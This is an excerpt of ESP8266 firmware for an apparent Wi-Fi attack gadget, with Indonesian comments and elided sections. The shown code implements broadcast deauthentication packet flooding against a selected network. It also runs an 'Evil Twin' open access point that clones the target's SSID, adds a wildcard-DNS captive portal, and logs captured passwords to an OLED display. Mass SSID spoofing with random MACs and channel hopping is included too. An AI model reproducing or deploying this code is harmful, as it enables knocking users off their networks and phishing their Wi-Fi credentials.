...
String massSpoofingSSIDs[32];
int massSpoofingCount = 0;
int currentSpoofingIndex = 0;
bool mass_spoofing_active = false;
unsigned long lastSpoofingChangeTime = 0;
const unsigned long SPOOFING_CHANGE_INTERVAL = 3000;
uint8_t currentSpoofingChannel = 1;
uint8_t spoofingMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};
...
void handleApiStopMassSpoofing();
...
@media (max-width: 768px) {
    ...
    .sidebar.show {
        transform: translateX(0);
        box-shadow: 5px 0 15px rgba(0,0,0,0.5); /* Add shadow when open */
    }
...
void loop() {
  ...
  // NEW: Deauthentication Attack Logic
  if (deauthing_active && _selectedNetwork.ssid != "") {
    // Calculate interval based on desired packet rate
    ...
    if (millis() - lastDeauthTime >= deauthInterval) {
      ...
      if (appSettings.enableDebugLogs) {
        ...
        Serial.printf("  DA: FF:FF:FF:FF:FF:FF (Broadcast)\n");
        Serial.printf("  SA: %s (AP BSSID)\n", bytesToStr(&deauthPacket[10], 6).c_str());
        Serial.printf("  BSSID: %s (AP BSSID)\n", bytesToStr(&deauthPacket[16], 6).c_str());
        Serial.printf("  Reason Code: 0x0001 (Unspecified reason)\n");
      }

      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      deauthPacketCount++; // Increment packet count
  ...
  if (mass_spoofing_active && massSpoofingCount > 0 && millis() - lastSpoofingChangeTime >= SPOOFING_CHANGE_INTERVAL) {
    ...
    if (appSettings.enableChannelHopping) {
        currentSpoofingChannel = (currentSpoofingChannel % 11) + 1;
    } else {
        currentSpoofingChannel = 1;
    }
...
void handleApiToggleDeauth() {
  if (_selectedNetwork.ssid != "") {
    ...
    if (deauthing_active) {
        deauthStartTime = millis(); // Start deauth timer
        deauthPacketCount = 0;     // Reset packet count
    }
...
void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid != "") {
    ...
    dnsServer.stop();
    WiFi.softAPdisconnect(true); // Disconnect from any existing softAP
    delay(100); // Give time for WiFi to settle

    if (hotspot_active) {
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Starting Evil Twin AP: " + _selectedNetwork.ssid);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      // Set channel explicitly for Evil Twin to match target network
      WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch, false, 0); 
      dnsServer.start(DNS_PORT, "*", apIP);
      evilTwinStartTime = millis(); // Start Evil Twin timer
      lastCapturedCredential = "None"; // Reset last captured credential
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot started for: " + _selectedNetwork.ssid + " on channel " + String(_selectedNetwork.ch));
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Stopping Evil Twin hotspot. Restarting Admin AP.");
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Admin AP restarted.");
    }
...
void handleApiMassSpoofing() {
  if (webServer.hasArg("plain")) {
    ...
    appSettings.enableRandomMac = doc["random_mac"] | false;
    appSettings.enableChannelHopping = doc["channel_hop"] | false;
    ...
    for (int i = 0; i < ssidList.length(); i++) {
      ...
      // Check for memory before adding more SSIDs
      if (ESP.getFreeHeap() < 5000 && appSettings.enableDebugLogs) { // Arbitrary low heap threshold
          Serial.println("[WARNING] Low heap memory detected during mass spoofing SSID parsing. Remaining SSIDs might be skipped.");
          break; // Stop adding SSIDs if memory is too low
      }
    }
    ...
    if (massSpoofingCount > 0) {
      ...
      currentSpoofingChannel = appSettings.enableChannelHopping ? 1 : 1;
...
void handleApiStatus() {
  ...
  doc["massSpoofingActive"] = mass_spoofing_active;
  doc["currentSpoofedSsid"] = (mass_spoofing_active && massSpoofingCount > 0) ? massSpoofingSSIDs[currentSpoofingIndex] : "N/A";
...
void handleCaptivePortal() {
  if (!hotspot_active) {
    // If hotspot is not active, redirect to admin panel or 404
    // This prevents captive portal from showing when it shouldn't
    if (!isAuthenticated()) {
      webServer.requestAuthentication();
    } else {
      webServer.send(404, "text/plain", "404: Not Found - Captive Portal Not Active");
    }
    return;
  }
  ...
  if (SPIFFS.exists(SETTINGS_FILE)) {
    ...
    if (settingsFile) {
      ...
      if (!error) {
        ...
        appSettings.enableRandomMac = doc["enableRandomMac"] | appSettings.enableRandomMac;
        appSettings.enableChannelHopping = doc["enableChannelHopping"] | appSettings.enableChannelHopping;
...
void saveSettings() {
  ...
  if (settingsFile) {
    ...
    doc["enableRandomMac"] = appSettings.enableRandomMac;
    doc["enableChannelHopping"] = appSettings.enableChannelHopping;
...
void handleApiSaveSettings() {
  if (webServer.hasArg("plain")) {
    ...
    bool newEnableRandomMac = doc["enableRandomMac"] | appSettings.enableRandomMac;
    bool newEnableChannelHopping = doc["enableChannelHopping"] | appSettings.enableChannelHopping;
...
void generateRandomMac(uint8_t* mac) {
  mac[0] = (uint8_t)(random(256) & 0xFE) | 0x02;
...
void startMassSpoofingAP(String ssid, uint8_t channel, uint8_t* mac) {
    ...
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str(), "", channel, false, 0);
    dnsServer.start(DNS_PORT, "*", apIP);
}
...
void updateOLEDDisplay() {
  ...
  // Baris 0: APP_NAME dan Free Heap
  display.setCursor(0, 0);
  display.print(APP_NAME);
  display.setCursor(SCREEN_WIDTH - 35, 0); // Pindah ke kanan untuk Free Heap
  display.print(ESP.getFreeHeap() / 1024); // Tampilkan dalam KB
  display.print("KB");
  display.drawFastHLine(0, 8, SCREEN_WIDTH, SSD1306_WHITE); // Garis di bawah judul

  // Baris 1: Klien Terhubung ke AP
  display.setCursor(0, 10);
  display.print("Clients: ");
  display.print(WiFi.softAPgetStationNum());

  // Baris 2: IP Address AP
  display.setCursor(0, 20);
  display.print("AP IP: ");
  display.print(WiFi.softAPIP());

  // Baris 3: Target Network
  ...
  if (_selectedNetwork.ssid != "") {
    ...
    display.print("None Selected");
  }

  // Baris 4 & 5: Status Serangan Detail
  display.setCursor(0, 40);
  if (deauthing_active) {
    display.print("Deauth: ON (Pkts:");
    ...
    display.print("EvilTwin: ON (Creds:");
    int passwordCount = 0;
    if (_capturedPasswordsLog.length() > 0) {
      for (int i = 0; i < _capturedPasswordsLog.length(); i++) {
        if (_capturedPasswordsLog.charAt(i) == '\n') {
    ...
    if (lastCred.length() > 12) lastCred = lastCred.substring(0, 12) + "...";
    display.print(lastCred);
  } else if (mass_spoofing_active) {
    display.print("Spoof: ON (SSIDs:");
    display.print(massSpoofingCount);
    display.print(")");
    display.setCursor(0, 50);
    display.print("Cur: ");
    String currentSpoofed = massSpoofingSSIDs[currentSpoofingIndex];
    if (currentSpoofed.length() > 12) currentSpoofed = currentSpoofed.substring(0, 12) + "...";
    display.print(currentSpoofed);
  } else {
    // Tampilan saat idle - hanya menampilkan status
    display.print("Status: Idle");
    // Baris 5 kosong saat idle
  }

  // Baris 6: Uptime (di bagian paling bawah)
